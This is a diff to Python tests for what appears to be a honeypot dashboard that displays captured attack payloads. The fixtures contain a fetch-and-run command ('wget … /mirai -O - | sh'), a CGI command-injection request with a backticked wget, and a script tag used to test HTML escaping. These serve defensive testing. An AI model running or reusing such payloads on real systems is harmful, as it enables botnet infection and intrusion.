@@ -142,11 +142,13 @@ class _FakeAggregateStore:
             'GET /normal HTTP/1.1',
         ]
 
-    def fetch_interesting_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
+    def fetch_interesting_raws(self, since=None, limit=20000, ip=None, host=None):  # noqa: ANN001, ANN002
         # The dashboard now pulls payloads via fetch_interesting_raws; mirror the
         # fetch_request_raws rows as dicts so _build_payload's payload panel works.
         self.since_seen = since
         self.sinces_seen.append(since)
+        self.ip_seen = ip
+        self.host_seen = host
         return [
             {
                 'raw': 'wget http://91.92.40.118/mirai -O - | sh',
@@ -257,7 +259,16 @@ def test_render_page_includes_payloads_section():
         'ioc_since': '2026-07-09 00:00:00.000000',
         'volume_bars': [],
         'log_rows': [],
-        'payloads': ['GET /hndunblock.cgi?x=`wget http://91.92.40.118/x` HTTP/1.1'],
+        'payloads': [
+            {
+                'raw': 'GET /hndunblock.cgi?x=`wget http://91.92.40.118/x` HTTP/1.1',
+                'bot_ip': '1.2.3.4',
+                'listen_port': 80,
+                'bot_country': 'US',
+                'request_command': 'GET',
+                'detected_id': None,
+            }
+        ],
         'log_summary': 'no captures',
     }
     html = _render_mod.render_page(payload)
@@ -265,7 +276,21 @@ def test_render_page_includes_payloads_section():
     assert 'PAYLOADS' in html
     # Raw payload surfaced, and a scripted payload can't inject markup.
     assert '91.92.40.118' in html
-    bad = _render_mod.render_page({**payload, 'payloads': ['<script>alert(1)</script>']})
+    bad = _render_mod.render_page(
+        {
+            **payload,
+            'payloads': [
+                {
+                    'raw': '<script>alert(1)</script>',
+                    'bot_ip': '',
+                    'listen_port': 0,
+                    'bot_country': '',
+                    'request_command': '',
+                    'detected_id': None,
+                }
+            ],
+        }
+    )
     assert '&lt;script&gt;' in bad
     assert '<script>alert(1)</script>' not in bad
     payload = {
